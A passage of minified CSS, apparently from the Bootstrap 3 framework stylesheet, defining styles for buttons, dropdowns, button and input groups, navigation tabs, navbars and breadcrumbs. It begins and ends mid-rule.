rgba(0,0,0,.125)}.btn.disabled,.btn[disabled],fieldset[disabled] .btn{pointer-events:none;cursor:not-allowed;filter:alpha(opacity=65);-webkit-box-shadow:none;box-shadow:none;opacity:.65}.btn-default{color:#333;background-color:#fff;border-color:#ccc}.btn-default.active,.btn-default.focus,.btn-default:active,.btn-default:focus,.btn-default:hover,.open>.dropdown-toggle.btn-default{color:#333;background-color:#e6e6e6;border-color:#adadad}.btn-default.active,.btn-default:active,.open>.dropdown-toggle.btn-default{background-image:none}.btn-default.disabled,.btn-default.disabled.active,.btn-default.disabled.focus,.btn-default.disabled:active,.btn-default.disabled:focus,.btn-default.disabled:hover,.btn-default[disabled],.btn-default[disabled].active,.btn-default[disabled].focus,.btn-default[disabled]:active,.btn-default[disabled]:focus,.btn-default[disabled]:hover,fieldset[disabled] .btn-default,fieldset[disabled] .btn-default.active,fieldset[disabled] .btn-default.focus,fieldset[disabled] .btn-default:active,fieldset[disabled] .btn-default:focus,fieldset[disabled] .btn-default:hover{background-color:#fff;border-color:#ccc}.btn-default .badge{color:#fff;background-color:#333}.btn-primary{color:#fff;background-color:#337ab7;border-color:#2e6da4}.btn-primary.active,.btn-primary.focus,.btn-primary:active,.btn-primary:focus,.btn-primary:hover,.open>.dropdown-toggle.btn-primary{color:#fff;background-color:#286090;border-color:#204d74}.btn-primary.active,.btn-primary:active,.open>.dropdown-toggle.btn-primary{background-image:none}.btn-primary.disabled,.btn-primary.disabled.active,.btn-primary.disabled.focus,.btn-primary.disabled:active,.btn-primary.disabled:focus,.btn-primary.disabled:hover,.btn-primary[disabled],.btn-primary[disabled].active,.btn-primary[disabled].focus,.btn-primary[disabled]:active,.btn-primary[disabled]:focus,.btn-primary[disabled]:hover,fieldset[disabled] .btn-primary,fieldset[disabled] .btn-primary.active,fieldset[disabled] .btn-primary.focus,fieldset[disabled] .btn-primary:active,fieldset[disabled] .btn-primary:focus,fieldset[disabled] .btn-primary:hover{background-color:#337ab7;border-color:#2e6da4}.btn-primary .badge{color:#337ab7;background-color:#fff}.btn-success{color:#fff;background-color:#5cb85c;border-color:#4cae4c}.btn-success.active,.btn-success.focus,.btn-success:active,.btn-success:focus,.btn-success:hover,.open>.dropdown-toggle.btn-success{color:#fff;background-color:#449d44;border-color:#398439}.btn-success.active,.btn-success:active,.open>.dropdown-toggle.btn-success{background-image:none}.btn-success.disabled,.btn-success.disabled.active,.btn-success.disabled.focus,.btn-success.disabled:active,.btn-success.disabled:focus,.btn-success.disabled:hover,.btn-success[disabled],.btn-success[disabled].active,.btn-success[disabled].focus,.btn-success[disabled]:active,.btn-success[disabled]:focus,.btn-success[disabled]:hover,fieldset[disabled] .btn-success,fieldset[disabled] .btn-success.active,fieldset[disabled] .btn-success.focus,fieldset[disabled] .btn-success:active,fieldset[disabled] .btn-success:focus,fieldset[disabled] .btn-success:hover{background-color:#5cb85c;border-color:#4cae4c}.btn-success .badge{color:#5cb85c;background-color:#fff}.btn-info{color:#fff;background-color:#5bc0de;border-color:#46b8da}.btn-info.active,.btn-info.focus,.btn-info:active,.btn-info:focus,.btn-info:hover,.open>.dropdown-toggle.btn-info{color:#fff;background-color:#31b0d5;border-color:#269abc}.btn-info.active,.btn-info:active,.open>.dropdown-toggle.btn-info{background-image:none}.btn-info.disabled,.btn-info.disabled.active,.btn-info.disabled.focus,.btn-info.disabled:active,.btn-info.disabled:focus,.btn-info.disabled:hover,.btn-info[disabled],.btn-info[disabled].active,.btn-info[disabled].focus,.btn-info[disabled]:active,.btn-info[disabled]:focus,.btn-info[disabled]:hover,fieldset[disabled] .btn-info,fieldset[disabled] .btn-info.active,fieldset[disabled] .btn-info.focus,fieldset[disabled] .btn-info:active,fieldset[disabled] .btn-info:focus,fieldset[disabled] .btn-info:hover{background-color:#5bc0de;border-color:#46b8da}.btn-info .badge{color:#5bc0de;background-color:#fff}.btn-warning{color:#fff;background-color:#f0ad4e;border-color:#eea236}.btn-warning.active,.btn-warning.focus,.btn-warning:active,.btn-warning:focus,.btn-warning:hover,.open>.dropdown-toggle.btn-warning{color:#fff;background-color:#ec971f;border-color:#d58512}.btn-warning.active,.btn-warning:active,.open>.dropdown-toggle.btn-warning{background-image:none}.btn-warning.disabled,.btn-warning.disabled.active,.btn-warning.disabled.focus,.btn-warning.disabled:active,.btn-warning.disabled:focus,.btn-warning.disabled:hover,.btn-warning[disabled],.btn-warning[disabled].active,.btn-warning[disabled].focus,.btn-warning[disabled]:active,.btn-warning[disabled]:focus,.btn-warning[disabled]:hover,fieldset[disabled] .btn-warning,fieldset[disabled] .btn-warning.active,fieldset[disabled] .btn-warning.focus,fieldset[disabled] .btn-warning:active,fieldset[disabled] .btn-warning:focus,fieldset[disabled] .btn-warning:hover{background-color:#f0ad4e;border-color:#eea236}.btn-warning .badge{color:#f0ad4e;background-color:#fff}.btn-danger{color:#fff;background-color:#d9534f;border-color:#d43f3a}.btn-danger.active,.btn-danger.focus,.btn-danger:active,.btn-danger:focus,.btn-danger:hover,.open>.dropdown-toggle.btn-danger{color:#fff;background-color:#c9302c;border-color:#ac2925}.btn-danger.active,.btn-danger:active,.open>.dropdown-toggle.btn-danger{background-image:none}.btn-danger.disabled,.btn-danger.disabled.active,.btn-danger.disabled.focus,.btn-danger.disabled:active,.btn-danger.disabled:focus,.btn-danger.disabled:hover,.btn-danger[disabled],.btn-danger[disabled].active,.btn-danger[disabled].focus,.btn-danger[disabled]:active,.btn-danger[disabled]:focus,.btn-danger[disabled]:hover,fieldset[disabled] .btn-danger,fieldset[disabled] .btn-danger.active,fieldset[disabled] .btn-danger.focus,fieldset[disabled] .btn-danger:active,fieldset[disabled] .btn-danger:focus,fieldset[disabled] .btn-danger:hover{background-color:#d9534f;border-color:#d43f3a}.btn-danger .badge{color:#d9534f;background-color:#fff}.btn-link{font-weight:400;color:#337ab7;border-radius:0}.btn-link,.btn-link.active,.btn-link:active,.btn-link[disabled],fieldset[disabled] .btn-link{background-color:transparent;-webkit-box-shadow:none;box-shadow:none}.btn-link,.btn-link:active,.btn-link:focus,.btn-link:hover{border-color:transparent}.btn-link:focus,.btn-link:hover{color:#23527c;text-decoration:underline;background-color:transparent}.btn-link[disabled]:focus,.btn-link[disabled]:hover,fieldset[disabled] .btn-link:focus,fieldset[disabled] .btn-link:hover{color:#777;text-decoration:none}.btn-group-lg>.btn,.btn-lg{padding:10px 16px;font-size:18px;line-height:1.3333333;border-radius:6px}.btn-group-sm>.btn,.btn-sm{padding:5px 10px;font-size:12px;line-height:1.5;border-radius:3px}.btn-group-xs>.btn,.btn-xs{padding:1px 5px;font-size:12px;line-height:1.5;border-radius:3px}.btn-block{display:block;width:100%}.btn-block+.btn-block{margin-top:5px}input[type=button].btn-block,input[type=reset].btn-block,input[type=submit].btn-block{width:100%}.fade{opacity:0;-webkit-transition:opacity .15s linear;-o-transition:opacity .15s linear;transition:opacity .15s linear}.fade.in{opacity:1}.collapse{display:none}.collapse.in{display:block}tr.collapse.in{display:table-row}tbody.collapse.in{display:table-row-group}.collapsing{position:relative;height:0;overflow:hidden;-webkit-transition-timing-function:ease;-o-transition-timing-function:ease;transition-timing-function:ease;-webkit-transition-duration:.35s;-o-transition-duration:.35s;transition-duration:.35s;-webkit-transition-property:height,visibility;-o-transition-property:height,visibility;transition-property:height,visibility}.caret{display:inline-block;width:0;height:0;margin-left:2px;vertical-align:middle;border-top:4px dashed;border-right:4px solid transparent;border-left:4px solid transparent}.dropdown,.dropup{position:relative}.dropdown-toggle:focus{outline:0}.dropdown-menu{position:absolute;top:100%;left:0;z-index:1000;display:none;float:left;min-width:160px;padding:5px 0;margin:2px 0 0;font-size:14px;text-align:left;list-style:none;background-color:#fff;-webkit-background-clip:padding-box;background-clip:padding-box;border:1px solid #ccc;border:1px solid rgba(0,0,0,.15);border-radius:4px;-webkit-box-shadow:0 6px 12px rgba(0,0,0,.175);box-shadow:0 6px 12px rgba(0,0,0,.175)}.dropdown-menu.pull-right{right:0;left:auto}.dropdown-menu .divider{height:1px;margin:9px 0;overflow:hidden;background-color:#e5e5e5}.dropdown-menu>li>a{display:block;padding:3px 20px;clear:both;font-weight:400;line-height:1.42857143;color:#333;white-space:nowrap}.dropdown-menu>li>a:focus,.dropdown-menu>li>a:hover{color:#262626;text-decoration:none;background-color:#f5f5f5}.dropdown-menu>.active>a,.dropdown-menu>.active>a:focus,.dropdown-menu>.active>a:hover{color:#fff;text-decoration:none;background-color:#337ab7;outline:0}.dropdown-menu>.disabled>a,.dropdown-menu>.disabled>a:focus,.dropdown-menu>.disabled>a:hover{color:#777}.dropdown-menu>.disabled>a:focus,.dropdown-menu>.disabled>a:hover{text-decoration:none;cursor:not-allowed;background-color:transparent;background-image:none;filter:progid:DXImageTransform.Microsoft.gradient(enabled=false)}.open>.dropdown-menu{display:block}.open>a{outline:0}.dropdown-menu-right{right:0;left:auto}.dropdown-menu-left{right:auto;left:0}.dropdown-header{display:block;padding:3px 20px;font-size:12px;line-height:1.42857143;color:#777;white-space:nowrap}.dropdown-backdrop{position:fixed;top:0;right:0;bottom:0;left:0;z-index:990}.pull-right>.dropdown-menu{right:0;left:auto}.dropup .caret,.navbar-fixed-bottom .dropdown .caret{content:"";border-top:0;border-bottom:4px solid}.dropup .dropdown-menu,.navbar-fixed-bottom .dropdown .dropdown-menu{top:auto;bottom:100%;margin-bottom:2px}@media (min-width:768px){.navbar-right .dropdown-menu{right:0;left:auto}.navbar-right .dropdown-menu-left{right:auto;left:0}}.btn-group,.btn-group-vertical{position:relative;display:inline-block;vertical-align:middle;}.btn-group-vertical>.btn,.btn-group>.btn{position:relative;float:left}.btn-group-vertical>.btn.active,.btn-group-vertical>.btn:active,.btn-group-vertical>.btn:focus,.btn-group-vertical>.btn:hover,.btn-group>.btn.active,.btn-group>.btn:active,.btn-group>.btn:focus,.btn-group>.btn:hover{z-index:2}.btn-group .btn+.btn,.btn-group .btn+.btn-group,.btn-group .btn-group+.btn,.btn-group .btn-group+.btn-group{margin-left:-1px}.btn-toolbar{margin-left:-5px}.btn-toolbar .btn-group,.btn-toolbar .input-group{float:left}.btn-toolbar>.btn,.btn-toolbar>.btn-group,.btn-toolbar>.input-group{margin-left:5px}.btn-group>.btn:not(:first-child):not(:last-child):not(.dropdown-toggle){border-radius:0}.btn-group>.btn:first-child{margin-left:0}.btn-group>.btn:first-child:not(:last-child):not(.dropdown-toggle){border-top-right-radius:0;border-bottom-right-radius:0}.btn-group>.btn:last-child:not(:first-child),.btn-group>.dropdown-toggle:not(:first-child){border-top-left-radius:0;border-bottom-left-radius:0}.btn-group>.btn-group{float:left}.btn-group>.btn-group:not(:first-child):not(:last-child)>.btn{border-radius:0}.btn-group>.btn-group:first-child:not(:last-child)>.btn:last-child,.btn-group>.btn-group:first-child:not(:last-child)>.dropdown-toggle{border-top-right-radius:0;border-bottom-right-radius:0}.btn-group>.btn-group:last-child:not(:first-child)>.btn:first-child{border-top-left-radius:0;border-bottom-left-radius:0}.btn-group .dropdown-toggle:active,.btn-group.open .dropdown-toggle{outline:0}.btn-group>.btn+.dropdown-toggle{padding-right:8px;padding-left:8px}.btn-group>.btn-lg+.dropdown-toggle{padding-right:12px;padding-left:12px}.btn-group.open .dropdown-toggle{-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,.125);box-shadow:inset 0 3px 5px rgba(0,0,0,.125)}.btn-group.open .dropdown-toggle.btn-link{-webkit-box-shadow:none;box-shadow:none}.btn .caret{margin-left:0}.btn-lg .caret{border-width:5px 5px 0;border-bottom-width:0}.dropup .btn-lg .caret{border-width:0 5px 5px}.btn-group-vertical>.btn,.btn-group-vertical>.btn-group,.btn-group-vertical>.btn-group>.btn{display:block;float:none;width:100%;max-width:100%}.btn-group-vertical>.btn-group>.btn{float:none}.btn-group-vertical>.btn+.btn,.btn-group-vertical>.btn+.btn-group,.btn-group-vertical>.btn-group+.btn,.btn-group-vertical>.btn-group+.btn-group{margin-top:-1px;margin-left:0}.btn-group-vertical>.btn:not(:first-child):not(:last-child){border-radius:0}.btn-group-vertical>.btn:first-child:not(:last-child){border-top-right-radius:4px;border-bottom-right-radius:0;border-bottom-left-radius:0}.btn-group-vertical>.btn:last-child:not(:first-child){border-top-left-radius:0;border-top-right-radius:0;border-bottom-left-radius:4px}.btn-group-vertical>.btn-group:not(:first-child):not(:last-child)>.btn{border-radius:0}.btn-group-vertical>.btn-group:first-child:not(:last-child)>.btn:last-child,.btn-group-vertical>.btn-group:first-child:not(:last-child)>.dropdown-toggle{border-bottom-right-radius:0;border-bottom-left-radius:0}.btn-group-vertical>.btn-group:last-child:not(:first-child)>.btn:first-child{border-top-left-radius:0;border-top-right-radius:0}.btn-group-justified{display:table;width:100%;table-layout:fixed;border-collapse:separate}.btn-group-justified>.btn,.btn-group-justified>.btn-group{display:table-cell;float:none;width:1%}.btn-group-justified>.btn-group .btn{width:100%}.btn-group-justified>.btn-group .dropdown-menu{left:auto}[data-toggle=buttons]>.btn input[type=checkbox],[data-toggle=buttons]>.btn input[type=radio],[data-toggle=buttons]>.btn-group>.btn input[type=checkbox],[data-toggle=buttons]>.btn-group>.btn input[type=radio]{position:absolute;clip:rect(0,0,0,0);pointer-events:none}.input-group{position:relative;display:table;border-collapse:separate}.input-group[class*=col-]{float:none;padding-right:0;padding-left:0}.input-group .form-control{position:relative;z-index:2;float:left;width:100%;margin-bottom:0}.input-group-lg>.form-control,.input-group-lg>.input-group-addon,.input-group-lg>.input-group-btn>.btn{height:46px;padding:10px 16px;font-size:18px;line-height:1.3333333;border-radius:6px}select.input-group-lg>.form-control,select.input-group-lg>.input-group-addon,select.input-group-lg>.input-group-btn>.btn{height:46px;line-height:46px}select[multiple].input-group-lg>.form-control,select[multiple].input-group-lg>.input-group-addon,select[multiple].input-group-lg>.input-group-btn>.btn,textarea.input-group-lg>.form-control,textarea.input-group-lg>.input-group-addon,textarea.input-group-lg>.input-group-btn>.btn{height:auto}.input-group-sm>.form-control,.input-group-sm>.input-group-addon,.input-group-sm>.input-group-btn>.btn{height:30px;padding:5px 10px;font-size:12px;line-height:1.5;border-radius:3px}select.input-group-sm>.form-control,select.input-group-sm>.input-group-addon,select.input-group-sm>.input-group-btn>.btn{height:30px;line-height:30px}select[multiple].input-group-sm>.form-control,select[multiple].input-group-sm>.input-group-addon,select[multiple].input-group-sm>.input-group-btn>.btn,textarea.input-group-sm>.form-control,textarea.input-group-sm>.input-group-addon,textarea.input-group-sm>.input-group-btn>.btn{height:auto}.input-group .form-control,.input-group-addon,.input-group-btn{display:table-cell}.input-group .form-control:not(:first-child):not(:last-child),.input-group-addon:not(:first-child):not(:last-child),.input-group-btn:not(:first-child):not(:last-child){border-radius:0}.input-group-addon,.input-group-btn{width:1%;white-space:nowrap;vertical-align:middle}.input-group-addon{padding:6px 12px;font-size:14px;font-weight:400;line-height:1;color:#555;text-align:center;background-color:#eee;border:1px solid #ccc;border-radius:4px}.input-group-addon.input-sm{padding:5px 10px;font-size:12px;border-radius:3px}.input-group-addon.input-lg{padding:10px 16px;font-size:18px;border-radius:6px}.input-group-addon input[type=checkbox],.input-group-addon input[type=radio]{margin-top:0}.input-group .form-control:first-child,.input-group-addon:first-child,.input-group-btn:first-child>.btn,.input-group-btn:first-child>.btn-group>.btn,.input-group-btn:first-child>.dropdown-toggle,.input-group-btn:last-child>.btn-group:not(:last-child)>.btn,.input-group-btn:last-child>.btn:not(:last-child):not(.dropdown-toggle){border-top-right-radius:0;border-bottom-right-radius:0}.input-group-addon:first-child{border-right:0}.input-group .form-control:last-child,.input-group-addon:last-child,.input-group-btn:first-child>.btn-group:not(:first-child)>.btn,.input-group-btn:first-child>.btn:not(:first-child),.input-group-btn:last-child>.btn,.input-group-btn:last-child>.btn-group>.btn,.input-group-btn:last-child>.dropdown-toggle{border-top-left-radius:0;border-bottom-left-radius:0}.input-group-addon:last-child{border-left:0}.input-group-btn{position:relative;font-size:0;white-space:nowrap}.input-group-btn>.btn{position:relative}.input-group-btn>.btn+.btn{margin-left:-1px}.input-group-btn>.btn:active,.input-group-btn>.btn:focus,.input-group-btn>.btn:hover{z-index:2}.input-group-btn:first-child>.btn,.input-group-btn:first-child>.btn-group{margin-right:-1px}.input-group-btn:last-child>.btn,.input-group-btn:last-child>.btn-group{margin-left:-1px}.nav{padding-left:0;margin-bottom:0;list-style:none}.nav>li{position:relative;display:block}.nav>li>a{position:relative;display:block;padding:10px 15px}.nav>li>a:focus,.nav>li>a:hover{text-decoration:none;background-color:#eee}.nav>li.disabled>a{color:#777}.nav>li.disabled>a:focus,.nav>li.disabled>a:hover{color:#777;text-decoration:none;cursor:not-allowed;background-color:transparent}.nav .open>a,.nav .open>a:focus,.nav .open>a:hover{background-color:#eee;border-color:#337ab7}.nav .nav-divider{height:1px;margin:9px 0;overflow:hidden;background-color:#e5e5e5}.nav>li>a>img{max-width:none}.nav-tabs{border-bottom:1px solid #ddd}.nav-tabs>li{float:left;margin-bottom:-1px}.nav-tabs>li>a{margin-right:2px;line-height:1.42857143;border:1px solid transparent;border-radius:4px 4px 0 0}.nav-tabs>li>a:hover{border-color:#eee #eee #ddd}.nav-tabs>li.active>a,.nav-tabs>li.active>a:focus,.nav-tabs>li.active>a:hover{color:#555;cursor:default;background-color:#fff;border:1px solid #ddd;border-bottom-color:transparent}.nav-tabs.nav-justified{width:100%;border-bottom:0}.nav-tabs.nav-justified>li{float:none}.nav-tabs.nav-justified>li>a{margin-bottom:5px;text-align:center}.nav-tabs.nav-justified>.dropdown .dropdown-menu{top:auto;left:auto}@media (min-width:768px){.nav-tabs.nav-justified>li{display:table-cell;width:1%}.nav-tabs.nav-justified>li>a{margin-bottom:0}}.nav-tabs.nav-justified>li>a{margin-right:0;border-radius:4px}.nav-tabs.nav-justified>.active>a,.nav-tabs.nav-justified>.active>a:focus,.nav-tabs.nav-justified>.active>a:hover{border:1px solid #ddd}@media (min-width:768px){.nav-tabs.nav-justified>li>a{border-bottom:1px solid #ddd;border-radius:4px 4px 0 0}.nav-tabs.nav-justified>.active>a,.nav-tabs.nav-justified>.active>a:focus,.nav-tabs.nav-justified>.active>a:hover{border-bottom-color:#fff}}.nav-pills>li{float:left}.nav-pills>li>a{border-radius:4px}.nav-pills>li+li{margin-left:2px}.nav-pills>li.active>a,.nav-pills>li.active>a:focus,.nav-pills>li.active>a:hover{color:#fff;background-color:#337ab7}.nav-stacked>li{float:none}.nav-stacked>li+li{margin-top:2px;margin-left:0}.nav-justified{width:100%}.nav-justified>li{float:none}.nav-justified>li>a{margin-bottom:5px;text-align:center}.nav-justified>.dropdown .dropdown-menu{top:auto;left:auto}@media (min-width:768px){.nav-justified>li{display:table-cell;width:1%}.nav-justified>li>a{margin-bottom:0}}.nav-tabs-justified{border-bottom:0}.nav-tabs-justified>li>a{margin-right:0;border-radius:4px}.nav-tabs-justified>.active>a,.nav-tabs-justified>.active>a:focus,.nav-tabs-justified>.active>a:hover{border:1px solid #ddd}@media (min-width:768px){.nav-tabs-justified>li>a{border-bottom:1px solid #ddd;border-radius:4px 4px 0 0}.nav-tabs-justified>.active>a,.nav-tabs-justified>.active>a:focus,.nav-tabs-justified>.active>a:hover{border-bottom-color:#fff}}.tab-content>.tab-pane{display:none}.tab-content>.active{display:block}.nav-tabs .dropdown-menu{margin-top:-1px;border-top-left-radius:0;border-top-right-radius:0}.navbar{position:relative;min-height:50px;margin-bottom:20px;border:1px solid transparent}@media (min-width:768px){.navbar{border-radius:4px}}@media (min-width:768px){.navbar-header{float:left}}.navbar-collapse{padding-right:15px;padding-left:15px;overflow-x:visible;-webkit-overflow-scrolling:touch;border-top:1px solid transparent;-webkit-box-shadow:inset 0 1px 0 rgba(255,255,255,.1);box-shadow:inset 0 1px 0 rgba(255,255,255,.1)}.navbar-collapse.in{overflow-y:auto}@media (min-width:768px){.navbar-collapse{width:auto;border-top:0;-webkit-box-shadow:none;box-shadow:none}.navbar-collapse.collapse{display:block!important;height:auto!important;padding-bottom:0;overflow:visible!important}.navbar-collapse.in{overflow-y:visible}.navbar-fixed-bottom .navbar-collapse,.navbar-fixed-top .navbar-collapse,.navbar-static-top .navbar-collapse{padding-right:0;padding-left:0}}.navbar-fixed-bottom .navbar-collapse,.navbar-fixed-top .navbar-collapse{max-height:340px}@media (max-device-width:480px)and (orientation:landscape){.navbar-fixed-bottom .navbar-collapse,.navbar-fixed-top .navbar-collapse{max-height:200px}}.container-fluid>.navbar-collapse,.container-fluid>.navbar-header,.container>.navbar-collapse,.container>.navbar-header{margin-right:-15px;margin-left:-15px}@media (min-width:768px){.container-fluid>.navbar-collapse,.container-fluid>.navbar-header,.container>.navbar-collapse,.container>.navbar-header{margin-right:0;margin-left:0}}.navbar-static-top{z-index:1000;border-width:0 0 1px}@media (min-width:768px){.navbar-static-top{border-radius:0}}.navbar-fixed-bottom,.navbar-fixed-top{position:fixed;right:0;left:0;z-index:1030}@media (min-width:768px){.navbar-fixed-bottom,.navbar-fixed-top{border-radius:0}}.navbar-fixed-top{top:0;border-width:0 0 1px}.navbar-fixed-bottom{bottom:0;margin-bottom:0;border-width:1px 0 0}.navbar-brand{float:left;height:50px;padding:15px 15px;font-size:18px;line-height:20px}.navbar-brand:focus,.navbar-brand:hover{text-decoration:none}.navbar-brand>img{display:block}@media (min-width:768px){.navbar>.container .navbar-brand,.navbar>.container-fluid .navbar-brand{margin-left:-15px}}.navbar-toggle{position:relative;float:right;padding:9px 10px;margin-top:8px;margin-right:15px;margin-bottom:8px;background-color:transparent;background-image:none;border:1px solid transparent;border-radius:4px}.navbar-toggle:focus{outline:0}.navbar-toggle .icon-bar{display:block;width:22px;height:2px;border-radius:1px}.navbar-toggle .icon-bar+.icon-bar{margin-top:4px}@media (min-width:768px){.navbar-toggle{display:none}}.navbar-nav{margin:7.5px -15px}.navbar-nav>li>a{padding-top:10px;padding-bottom:10px;line-height:20px}@media (max-width:767px){.navbar-nav .open .dropdown-menu{position:static;float:none;width:auto;margin-top:0;background-color:transparent;border:0;-webkit-box-shadow:none;box-shadow:none}.navbar-nav .open .dropdown-menu .dropdown-header,.navbar-nav .open .dropdown-menu>li>a{padding:5px 15px 5px 25px}.navbar-nav .open .dropdown-menu>li>a{line-height:20px}.navbar-nav .open .dropdown-menu>li>a:focus,.navbar-nav .open .dropdown-menu>li>a:hover{background-image:none}}@media (min-width:768px){.navbar-nav{float:left;margin:0}.navbar-nav>li{float:left}.navbar-nav>li>a{padding-top:15px;padding-bottom:15px}}.navbar-form{padding:10px 15px;margin-top:8px;margin-right:-15px;margin-bottom:8px;margin-left:-15px;border-top:1px solid transparent;border-bottom:1px solid transparent;-webkit-box-shadow:inset 0 1px 0 rgba(255,255,255,.1),0 1px 0 rgba(255,255,255,.1);box-shadow:inset 0 1px 0 rgba(255,255,255,.1),0 1px 0 rgba(255,255,255,.1)}@media (min-width:768px){.navbar-form .form-group{display:inline-block;margin-bottom:0;vertical-align:middle}.navbar-form .form-control{display:inline-block;width:auto;vertical-align:middle}.navbar-form .form-control-static{display:inline-block}.navbar-form .input-group{display:inline-table;vertical-align:middle}.navbar-form .input-group .form-control,.navbar-form .input-group .input-group-addon,.navbar-form .input-group .input-group-btn{width:auto}.navbar-form .input-group>.form-control{width:100%}.navbar-form .control-label{margin-bottom:0;vertical-align:middle}.navbar-form .checkbox,.navbar-form .radio{display:inline-block;margin-top:0;margin-bottom:0;vertical-align:middle}.navbar-form .checkbox label,.navbar-form .radio label{padding-left:0}.navbar-form .checkbox input[type=checkbox],.navbar-form .radio input[type=radio]{position:relative;margin-left:0}.navbar-form .has-feedback .form-control-feedback{top:0}}@media (max-width:767px){.navbar-form .form-group{margin-bottom:5px}.navbar-form .form-group:last-child{margin-bottom:0}}@media (min-width:768px){.navbar-form{width:auto;padding-top:0;padding-bottom:0;margin-right:0;margin-left:0;border:0;-webkit-box-shadow:none;box-shadow:none}}.navbar-nav>li>.dropdown-menu{margin-top:0;border-top-left-radius:0;border-top-right-radius:0}.navbar-fixed-bottom .navbar-nav>li>.dropdown-menu{margin-bottom:0;border-top-left-radius:4px;border-top-right-radius:4px;border-bottom-right-radius:0;border-bottom-left-radius:0}.navbar-btn{margin-top:8px;margin-bottom:8px}.navbar-btn.btn-sm{margin-top:10px;margin-bottom:10px}.navbar-btn.btn-xs{margin-top:14px;margin-bottom:14px}.navbar-text{margin-top:15px;margin-bottom:15px}@media (min-width:768px){.navbar-text{float:left;margin-right:15px;margin-left:15px}}@media (min-width:768px){.navbar-left{float:left!important}.navbar-right{float:right!important;margin-right:-15px}.navbar-right~.navbar-right{margin-right:0}}.navbar-default{background-color:#f8f8f8;border-color:#e7e7e7}.navbar-default .navbar-brand{color:#777}.navbar-default .navbar-brand:focus,.navbar-default .navbar-brand:hover{color:#5e5e5e;background-color:transparent}.navbar-default .navbar-text{color:#777}.navbar-default .navbar-nav>li>a{color:#777}.navbar-default .navbar-nav>li>a:focus,.navbar-default .navbar-nav>li>a:hover{color:#333;background-color:transparent}.navbar-default .navbar-nav>.active>a,.navbar-default .navbar-nav>.active>a:focus,.navbar-default .navbar-nav>.active>a:hover{color:#555;background-color:#e7e7e7}.navbar-default .navbar-nav>.disabled>a,.navbar-default .navbar-nav>.disabled>a:focus,.navbar-default .navbar-nav>.disabled>a:hover{color:#ccc;background-color:transparent}.navbar-default .navbar-toggle{border-color:#ddd}.navbar-default .navbar-toggle:focus,.navbar-default .navbar-toggle:hover{background-color:#ddd}.navbar-default .navbar-toggle .icon-bar{background-color:#888}.navbar-default .navbar-collapse,.navbar-default .navbar-form{border-color:#e7e7e7}.navbar-default .navbar-nav>.open>a,.navbar-default .navbar-nav>.open>a:focus,.navbar-default .navbar-nav>.open>a:hover{color:#555;background-color:#e7e7e7}@media (max-width:767px){.navbar-default .navbar-nav .open .dropdown-menu>li>a{color:#777}.navbar-default .navbar-nav .open .dropdown-menu>li>a:focus,.navbar-default .navbar-nav .open .dropdown-menu>li>a:hover{color:#333;background-color:transparent}.navbar-default .navbar-nav .open .dropdown-menu>.active>a,.navbar-default .navbar-nav .open .dropdown-menu>.active>a:focus,.navbar-default .navbar-nav .open .dropdown-menu>.active>a:hover{color:#555;background-color:#e7e7e7}.navbar-default .navbar-nav .open .dropdown-menu>.disabled>a,.navbar-default .navbar-nav .open .dropdown-menu>.disabled>a:focus,.navbar-default .navbar-nav .open .dropdown-menu>.disabled>a:hover{color:#ccc;background-color:transparent}}.navbar-default .navbar-link{color:#777}.navbar-default .navbar-link:hover{color:#333}.navbar-default .btn-link{color:#777}.navbar-default .btn-link:focus,.navbar-default .btn-link:hover{color:#333}.navbar-default .btn-link[disabled]:focus,.navbar-default .btn-link[disabled]:hover,fieldset[disabled] .navbar-default .btn-link:focus,fieldset[disabled] .navbar-default .btn-link:hover{color:#ccc}.navbar-inverse{background-color:#222;border-color:#080808}.navbar-inverse .navbar-brand{color:#9d9d9d}.navbar-inverse .navbar-brand:focus,.navbar-inverse .navbar-brand:hover{color:#fff;background-color:transparent}.navbar-inverse .navbar-text{color:#9d9d9d}.navbar-inverse .navbar-nav>li>a{color:#9d9d9d}.navbar-inverse .navbar-nav>li>a:focus,.navbar-inverse .navbar-nav>li>a:hover{color:#fff;background-color:transparent}.navbar-inverse .navbar-nav>.active>a,.navbar-inverse .navbar-nav>.active>a:focus,.navbar-inverse .navbar-nav>.active>a:hover{color:#fff;background-color:#080808}.navbar-inverse .navbar-nav>.disabled>a,.navbar-inverse .navbar-nav>.disabled>a:focus,.navbar-inverse .navbar-nav>.disabled>a:hover{color:#444;background-color:transparent}.navbar-inverse .navbar-toggle{border-color:#333}.navbar-inverse .navbar-toggle:focus,.navbar-inverse .navbar-toggle:hover{background-color:#333}.navbar-inverse .navbar-toggle .icon-bar{background-color:#fff}.navbar-inverse .navbar-collapse,.navbar-inverse .navbar-form{border-color:#101010}.navbar-inverse .navbar-nav>.open>a,.navbar-inverse .navbar-nav>.open>a:focus,.navbar-inverse .navbar-nav>.open>a:hover{color:#fff;background-color:#080808}@media (max-width:767px){.navbar-inverse .navbar-nav .open .dropdown-menu>.dropdown-header{border-color:#080808}.navbar-inverse .navbar-nav .open .dropdown-menu .divider{background-color:#080808}.navbar-inverse .navbar-nav .open .dropdown-menu>li>a{color:#9d9d9d}.navbar-inverse .navbar-nav .open .dropdown-menu>li>a:focus,.navbar-inverse .navbar-nav .open .dropdown-menu>li>a:hover{color:#fff;background-color:transparent}.navbar-inverse .navbar-nav .open .dropdown-menu>.active>a,.navbar-inverse .navbar-nav .open .dropdown-menu>.active>a:focus,.navbar-inverse .navbar-nav .open .dropdown-menu>.active>a:hover{color:#fff;background-color:#080808}.navbar-inverse .navbar-nav .open .dropdown-menu>.disabled>a,.navbar-inverse .navbar-nav .open .dropdown-menu>.disabled>a:focus,.navbar-inverse .navbar-nav .open .dropdown-menu>.disabled>a:hover{color:#444;background-color:transparent}}.navbar-inverse .navbar-link{color:#9d9d9d}.navbar-inverse .navbar-link:hover{color:#fff}.navbar-inverse .btn-link{color:#9d9d9d}.navbar-inverse .btn-link:focus,.navbar-inverse .btn-link:hover{color:#fff}.navbar-inverse .btn-link[disabled]:focus,.navbar-inverse .btn-link[disabled]:hover,fieldset[disabled] .navbar-inverse .btn-link:focus,fieldset[disabled] .navbar-inverse .btn-link:hover{color:#444}.breadcrumb{padding:8px 15px;margin-bottom:20px;list-style:none;background-color:#f5f5f5;border-radius:4px}.breadcrumb>li{display:inline-block}.breadcrumb>li+li:before{padding:0 5px;color:#ccc;content:"/\00a0"}.breadcrumb>.active{color:#777}.pagination{display:inline-block;padding-left:0;margin:20px 0;border-radius:4px}.pagination>li{display:inline}.pagination>li>a,.pagination>li>span{position:relative;float:left;padding:6px 